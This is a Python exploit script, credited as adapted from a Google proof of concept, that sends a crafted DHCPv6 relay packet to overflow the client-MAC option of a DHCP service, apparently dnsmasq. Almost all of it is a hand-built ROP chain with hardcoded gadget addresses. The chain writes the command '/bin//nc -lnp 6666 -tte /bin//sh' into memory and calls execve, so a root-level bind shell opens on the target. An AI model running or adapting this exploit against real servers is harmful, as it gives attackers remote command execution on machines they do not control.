#!/usr/bin/python
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Adapted from a simple POC by:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/
#
# Exploit by:
#  Alex Caceres (@_hyp3ri0n)
#  and Mark Haase
#


from struct import pack
import sys
import socket

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    #0xb7eee98e : mov eax, dword ptr [ecx] ; pop ebp ; ret
    #0xb7f62bf0 : pop ecx ; pop eax ; ret
    #0xb7f96975 : pop ecx ; pop ebx ; pop ebp ; ret
    #0x0002b107 : xor eax, eax ; pop ebp ; ret   0x8078b45
    #0xb7f03c3c : xor    edx,edx
    #0x000e5a71 : pop edx ; pop ecx ; pop ebx ; ret

    pad = pack("<I", 0x42424242)
    data_beginning = pack("<I", 0x0808a8a0)
    stack_start = pack("<I", 0x0808a8a0)
    pop_ecx_eax = pack("<I", 0xb7f62bf0)
    pop_ecx_ebx_ebp = pack("<I", 0xb7f96975)
    mov_to_ecx_pop_ebp = pack("<I", 0xb7eee98e)
    xor_eax = pack("<I", 0xb7eb2107) #xor eax, eax ; pop ebp ; ret   0x8078b45
    xor_edi = pack("<I", 0xb7f03c3c)
    pop_eax = pack("<I", 0xb7e9b21c)
    mov_eax_to_ecx_loc_pop_ebp = pack("<I", 0xb7ef4db2) #0x0006ddb2 : mov dword ptr [ecx], eax ; pop ebp ; ret
    pop_edx_ecx_ebx = pack("<I", 0xb7f6ca71)
    inc_eax = pack("<I", 0xb7eaa3fd)
    int80 = pack("<I", 0xb7ea6f41)
    int802 = pack("<I", 0xb7f292e8)

    print("0x0808a8a0")

    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, "A" * 50 + "BBBB" + 


                   #pop_ecx_eax +
                   #stack_start + 
                   #pad +

                   #pop_eax +
                   #"/usr" +

                   #mov_eax_to_ecx_loc_pop_ebp +
                   #pad +

                   #####################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0x4) +
                   pad +


                   pop_eax +
                   "/bin" +

                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   ######################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0x8) +
                   pad +

                   #!ACEDIT
                   pop_eax +
                   "//nc" +

                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   ######################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0xd) +
                   pad +

                   pop_eax +
                   "-lnp" +

                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   ######################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0x12) +
                   pad +

                   pop_eax +
                   "6666" +

                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   #####################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0x17) +
                   pad +

                   pop_eax +
                   "-tte" +

                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   #####################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0x1c) +
                   pad +

                   xor_eax +
                   pad +
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   pop_eax +
                   "/bin" +

                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   ####################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0x20) +
                   pad +


                   pop_eax +
                   "//sh" +

                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   #####################################

                   pop_ecx_eax +
                   pack("<I", 0x0808a8a0 + 0x24) +
                   pad +

                   xor_eax +
                   pad +
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +
                   
                   ########################################---------------------

                   #@ of /bin//nc
                   pop_edx_ecx_ebx +
                   pad +
                   pack("<I", 0x0808a8a0 + 0x60) +
                   pad +

                   pop_eax +
                   pack("<I", 0x0808a8a0 + 0x4)+
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   #########################################
                   #@ of -lnp
                   pop_edx_ecx_ebx +
                   pad +
                   pack("<I", 0x0808a8a0 + 0x64) +
                   pad +

                   pop_eax +
                   pack("<I", 0x808a8ad)+
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                  #######################################
                   # @ of 6666
                   pop_edx_ecx_ebx +
                   pad +
                   pack("<I", 0x0808a8a0 + 0x68) +
                   pad +

                   pop_eax +
                   pack("<I", 0x808a8b2)+
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   ########################################
                   # @ of -tte
                   pop_edx_ecx_ebx +
                   pad +
                   pack("<I", 0x0808a8a0 + 0x6c) +
                   pad +

                   pop_eax +
                   pack("<I", 0x808a8b7)+
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   ########################################

                   #@ of /bin//sh
                   pop_edx_ecx_ebx +
                   pad +
                   pack("<I", 0x0808a8a0 + 0x70) +
                   pad +
                   
                   xor_eax +
                   pad +
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   pop_eax +
                   pack("<I", 0x808a8bc)+
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +
                   

                   #####null terminate args###############

                   pop_ecx_eax +
                   pack("<I", 0x808a914) +
                   pad +

                   xor_eax +
                   pad +
                   mov_eax_to_ecx_loc_pop_ebp +
                   pad +

                   #################EXECUTE###############

                   xor_eax + 
                   pad +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   inc_eax +
                   pop_edx_ecx_ebx +
                   pack("<I", 0x0808a8a0) +
                   pack("<I", 0x0808a8a0 + 0x60) +
                   pack("<I", 0x0808a8a0 + 0x4) +
                   int802

                   ########################################

                  # pop_edx_ecx_ebx +
                  # pad +
                  # pack("<I", 0x0808a8a0 + 0x10) +
                  # pad +

                  # pop_eax +
                  # pack("<I", 0x808a8ad + 0xc)+
                  # mov_eax_to_ecx_loc_pop_ebp +
                  # pad +

                   #######################################

                  # pop_edx_ecx_ebx +
                  # pad +
                  # pack("<I", 0x0808a8a0 + 0x10) +
                  # pad +

                  # pop_eax +
                  # pack("<I", 0x808a8ad + 0xc)+
                  # mov_eax_to_ecx_loc_pop_ebp +
                  # pad +

                   #######################################

                  # pop_edx_ecx_ebx +
                  # pad +
                  # pack("<I", 0x0808a8a0 + 0x14) +
                  # pad +

                  # pop_eax +
                  # pack("<I", 0x808a8ad + 0x10)+
                  # mov_eax_to_ecx_loc_pop_ebp +
                  # pad

                   #####################################

                   #xor_eax
                   #xor_edi
),
    ])

    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))

